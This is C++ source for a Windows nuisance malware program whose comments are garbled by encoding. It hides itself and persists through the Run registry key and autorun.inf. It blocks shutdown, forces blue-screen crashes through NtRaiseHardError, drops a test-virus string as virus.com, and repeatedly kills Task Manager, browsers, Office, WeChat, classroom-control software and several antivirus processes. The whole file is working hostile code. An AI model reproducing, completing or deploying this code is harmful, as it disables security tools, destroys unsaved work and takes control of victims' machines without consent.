#include <iostream>
#include <windows.h>
#include <TlHelp32.h>
#include <direct.h>
using namespace std;
BOOL UpPrivilegeValue()//���Ȩ�� 
{
	HANDLE hToken=0;
	if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ALL_ACCESS,&hToken))
	{
		return FALSE;
	}
	LUID luid;
	if(!LookupPrivilegeValue(0,SE_DEBUG_NAME,&luid))
	{
		CloseHandle(hToken);
		return FALSE;
	}
	TOKEN_PRIVILEGES Tok;
	Tok.PrivilegeCount=1;
	Tok.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
	Tok.Privileges[0].Luid=luid;
	if(FALSE==AdjustTokenPrivileges(hToken,FALSE,&Tok,sizeof(Tok),0,0))
	{
		CloseHandle(hToken);
		return FALSE;
	}
	if(GetLastError()==ERROR_NOT_ALL_ASSIGNED)
	{
		CloseHandle(hToken);
		return FALSE;
	}
	CloseHandle(hToken);
	return TRUE;
}
DWORD WINAPI NOSHUT(LPVOID Param)
{
	while(1)
	{
		system("shutdown -a");//��ֹ�ػ� 
		Sleep(500);
	}
}
DWORD WINAPI WEB(LPVOID Param)
{
	while(1)
	{
		Sleep(300000);
		system("start luogu.com.cn");
		Sleep(300000);
		system("start cn.bing.com");
		Sleep(300000);
		system("start zzcjas.github.io");
		Sleep(300000);
		system("start github.com");
		Sleep(300000);
		system("start githubs.com");
		Sleep(300000);
		system("start luogu.org");//����վ�Ż��û� 
	}
}
DWORD WINAPI BSOD(LPVOID Param)
{
	while(1)
	{
		Sleep(950000);
		HMODULE ntdll = LoadLibrary("ntdll.dll");
	 	FARPROC RtlAdjPriv=GetProcAddress(ntdll,"RtlAdjustPrivilege");
	 	FARPROC NtRaiseHardErr=GetProcAddress(ntdll,"NtRaiseHardError");
	 	unsigned char ErrKill;
	 	long unsigned int HDErr;
	 	((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPriv)(0x13,true,false,&ErrKill);
	 	((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardErr)(0xc0000233,0,0,0,6, &HDErr);
	}
}//�Ż��û������� 
DWORD WINAPI FILEop(LPVOID Param)
{
	char pathn[6145];
	ZeroMemory(&pathn,sizeof(pathn));
	_getcwd(pathn,6145);
	string p=pathn;
	string kkk="";
	if(p.find("C:\\")!=string::npos)
	{
		kkk="C:\\autorun.inf";
	}
	else if(p.find("D:\\")!=string::npos)
	{
		kkk="D:\\autorun.inf";
	}
	else
	{
		kkk="E:\\autorun.inf";
	}
	string autorun="[AutoRun]\nOpen=";
	autorun+=p;
	autorun+="\\����.exe";
	FILE *a=fopen(kkk.c_str(),"w");
	fprintf(a,"%s",autorun.c_str());
	fclose(a);//��C��D��д��autorun.inf�ļ�,һ��ͼ�����ٴ����в��� 
	while(1)
	{
		string s="9T.@1D! 1:U1;9TUI1?HV\"\"HVE$(\" 3L25 /% 3%L /5(7(342L5$25L'(-$@E)J)K";//���������˵ķ��������Դ���(���Դ���뱻ɾ��) 
		for(register int i=0;i<s.size();i++)
		{
			s[i]^='a';
		}//���� 
		FILE *p=fopen("C:\\virus.com","w");//������ 
		fprintf(p,"%s",s.c_str());//C���ͷŷ��������Դ�����һ���û� 
		fclose(p);
		p=fopen("D:\\virus.com","w");//������ 
		fprintf(p,"%s",s.c_str());//D���ͷŷ��������Դ�����һ���û� 
		fclose(p);
		system("cd /d C:\\Program Files\\Windows Defender");
		system("mpcmdrun.exe -scan -1 -disableremediation");//��Windows�Դ�ɱ�����ɨ��һ��,�϶��ᱨ��,����һ���û� 
		Sleep(240000);
	}
}//Ū�����������Դ�����һ���û�
DWORD WINAPI KILL(LPVOID Param)
{
	while(1)
	{
		DWORD ProcessId=0;
		HANDLE hProcessSnapShot=NULL;
		PROCESSENTRY32 pe32;
		ZeroMemory(&pe32,sizeof(pe32));
		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
		pe32.dwSize=sizeof(PROCESSENTRY32);
		if(Process32First(hProcessSnapShot,&pe32))
		{
			do
			{
				if("devcpp.exe"==(string)(pe32.szExeFile))
				{
					ProcessId=pe32.th32ProcessID;
					break;
				}
			}while(Process32Next(hProcessSnapShot,&pe32));
		}
		::CloseHandle(hProcessSnapShot);
    	HANDLE hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
    	TerminateProcess(hProcess,0);
    	Sleep(1000);
    	ProcessId=0;
		hProcessSnapShot=NULL;
		ZeroMemory(&pe32,sizeof(pe32));
		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
		pe32.dwSize=sizeof(PROCESSENTRY32);
		if(Process32First(hProcessSnapShot,&pe32))
		{
			do
			{
				if("360safe.exe"==(string)(pe32.szExeFile))
				{
					ProcessId=pe32.th32ProcessID;
					break;
				}
			}while(Process32Next(hProcessSnapShot,&pe32));
		}
		::CloseHandle(hProcessSnapShot);
    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
    	TerminateProcess(hProcess,0);
    	Sleep(1000);
    	ProcessId=0;
		hProcessSnapShot=NULL;
		ZeroMemory(&pe32,sizeof(pe32));
		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
		pe32.dwSize=sizeof(PROCESSENTRY32);
		if(Process32First(hProcessSnapShot,&pe32))
		{
			do
			{
				if("Taskmgr.exe"==(string)(pe32.szExeFile))
				{
					ProcessId=pe32.th32ProcessID;
					break;
				}
			}while(Process32Next(hProcessSnapShot,&pe32));
		}
		::CloseHandle(hProcessSnapShot);
    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
    	TerminateProcess(hProcess,0);
    	Sleep(1000);
    	system("taskkill /im msedge.exe /f");
    	Sleep(100);
    	system("taskkill /im chrome.exe /f");
    	Sleep(100);
    	system("taskkill /im notepad.exe /f");
    	Sleep(100);
    	system("taskkill /im write.exe /f");
    	Sleep(100);
    	system("taskkill /im devcpp.exe /f");
    	Sleep(100);
    	system("taskkill /im mspaint.exe /f");
    	Sleep(100);
    	system("taskkill /im WINWORD.EXE /f");
    	Sleep(100);
    	system("taskkill /im EXCEL.EXE /f");
    	Sleep(100);
    	system("taskkill /im POWERPNT.EXE /f");
    	Sleep(100);
    	system("taskkill /im ONENOTE.EXE /f");
    	Sleep(100);
    	system("taskkill /im ONENOTEM.EXE /f");
    	Sleep(100);
    	system("taskkill /im WeChat.exe /f");
    	Sleep(100);
    	system("taskkill /im WechatBrowser.exe /f");
    	Sleep(100);
    	system("taskkill /im Mcshield.exe /f");
    	Sleep(100);
    	system("taskkill /im scan32.exe /f");
    	Sleep(100);
    	system("taskkill /im UpdaterUI.exe /f");
    	Sleep(100);
    	system("taskkill /im TBMon.exe /f");
    	Sleep(100);
    	system("taskkill /im Rav.exe /f");
    	Sleep(100);
    	system("taskkill /im wemeetapp.exe /f");
    	Sleep(100);
    	system("taskkill /im iexplorer.exe /f");
    	Sleep(100);
    	system("taskkill /im ielowutil.exe /f");
    	Sleep(100);
    	system("taskkill /im studentmain.exe /f");
    	ProcessId=0;
		hProcessSnapShot=NULL;
		ZeroMemory(&pe32,sizeof(pe32));
		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
		pe32.dwSize=sizeof(PROCESSENTRY32);
		if(Process32First(hProcessSnapShot,&pe32))
		{
			do
			{
				if("studentmain.exe"==(string)(pe32.szExeFile))
				{
					ProcessId=pe32.th32ProcessID;
					break;
				}
			}while(Process32Next(hProcessSnapShot,&pe32));
		}
		::CloseHandle(hProcessSnapShot);
    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
    	TerminateProcess(hProcess,0);
    	Sleep(1000);
		Sleep(360000);
	}
}//�ѳ��ý���ը��(˳����æ,�Ѽ������ɱ��)
char pathn[6145];
string k;
int main()
{
	ShowWindow(GetForegroundWindow(),0);//���ش��� 
	UpPrivilegeValue();//��Ȩ 
	_getcwd(pathn,6145);//��·�� 
	k=pathn;
	k+="\\����.exe";
	SetFileAttributes(pathn,FILE_ATTRIBUTE_HIDDEN);//�����ļ� 
    HKEY hKey;
    char *pppp=(char*)k.c_str();
    LPCTSTR StrKey="Software//Microsoft//Windows//CurrentVersion//Run";
    ::RegOpenKeyEx(HKEY_CURRENT_USER,StrKey,NULL,KEY_ALL_ACCESS,&hKey);
    LPCSTR KeyValue="����.exe";
    ::RegSetValueEx(hKey,(LPCTSTR)KeyValue,0,REG_SZ,(BYTE*)(LPCSTR)pppp,strlen(pppp)+1);
    ::RegCloseKey(hKey); //���������� 
    FILE *lock=fopen("����.exe","rb");//�����ļ�,ɱ���� 
	CreateThread(NULL,4096,&NOSHUT,NULL,NULL,NULL);
	CreateThread(NULL,4096,&WEB,NULL,NULL,NULL);
	CreateThread(NULL,4096,&BSOD,NULL,NULL,NULL);
	CreateThread(NULL,6144,&KILL,NULL,NULL,NULL);
	CreateThread(NULL,4096,&FILEop,NULL,NULL,NULL);
	while(1);
}
